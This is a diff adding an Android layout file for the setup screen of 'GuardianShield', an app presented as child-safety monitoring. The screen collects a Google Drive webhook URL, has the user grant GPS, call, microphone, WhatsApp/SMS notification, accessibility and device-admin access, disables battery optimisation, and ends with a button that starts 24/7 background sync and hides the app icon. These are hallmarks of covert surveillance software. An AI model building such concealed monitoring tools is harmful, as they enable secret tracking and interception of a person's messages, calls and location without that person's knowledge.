@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#0F172A"
+    android:padding="20dp">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical">
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="🛡️ GuardianShield Setup"
+            android:textColor="#38BDF8"
+            android:textSize="24sp"
+            android:textStyle="bold" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:text="Child Safety & Monitoring Service Configuration. Complete the steps below to start 24/7 protection."
+            android:textColor="#94A3B8"
+            android:textSize="14sp" />
+
+        <View
+            android:layout_width="match_parent"
+            android:layout_height="1dp"
+            android:layout_marginVertical="16dp"
+            android:background="#334155" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Google Drive Webhook URL:"
+            android:textColor="#F1F5F9"
+            android:textStyle="bold" />
+
+        <EditText
+            android:id="@+id/etWebhookUrl"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="6dp"
+            android:background="#1E293B"
+            android:hint="https://script.google.com/macros/s/.../exec"
+            android:padding="12dp"
+            android:textColor="#F8FAFC"
+            android:textColorHint="#64748B"
+            android:textSize="13sp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="16dp"
+            android:text="Required Permissions & Services:"
+            android:textColor="#F1F5F9"
+            android:textStyle="bold" />
+
+        <Button
+            android:id="@+id/btnGrantPermissions"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:backgroundTint="#2563EB"
+            android:text="1. Grant System Permissions (GPS, Calls, Mic)"
+            android:textColor="#FFFFFF" />
+
+        <Button
+            android:id="@+id/btnNotificationAccess"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:backgroundTint="#4F46E5"
+            android:text="2. Enable Notification Sync (WhatsApp/SMS)"
+            android:textColor="#FFFFFF" />
+
+        <Button
+            android:id="@+id/btnAccessibilityAccess"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:backgroundTint="#7C3AED"
+            android:text="3. Enable Accessibility Protection"
+            android:textColor="#FFFFFF" />
+
+        <Button
+            android:id="@+id/btnDeviceAdmin"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:backgroundTint="#9333EA"
+            android:text="4. Activate Device Admin & Screen Lock"
+            android:textColor="#FFFFFF" />
+
+        <Button
+            android:id="@+id/btnIgnoreBattery"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="8dp"
+            android:backgroundTint="#0D9488"
+            android:text="5. Disable Battery Optimization"
+            android:textColor="#FFFFFF" />
+
+        <View
+            android:layout_width="match_parent"
+            android:layout_height="1dp"
+            android:layout_marginVertical="20dp"
+            android:background="#334155" />
+
+        <Button
+            android:id="@+id/btnActivateAndHide"
+            android:layout_width="match_parent"
+            android:layout_height="56dp"
+            android:backgroundTint="#16A34A"
+            android:text="🚀 ACTIVATE PROTECTION & HIDE ICON"
+            android:textColor="#FFFFFF"
+            android:textSize="15sp"
+            android:textStyle="bold" />
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="10dp"
+            android:gravity="center"
+            android:text="* Tapping this will start 24/7 background sync and hide this icon from the app drawer."
+            android:textColor="#64748B"
+            android:textSize="12sp" />
+
+    </LinearLayout>
+</ScrollView>
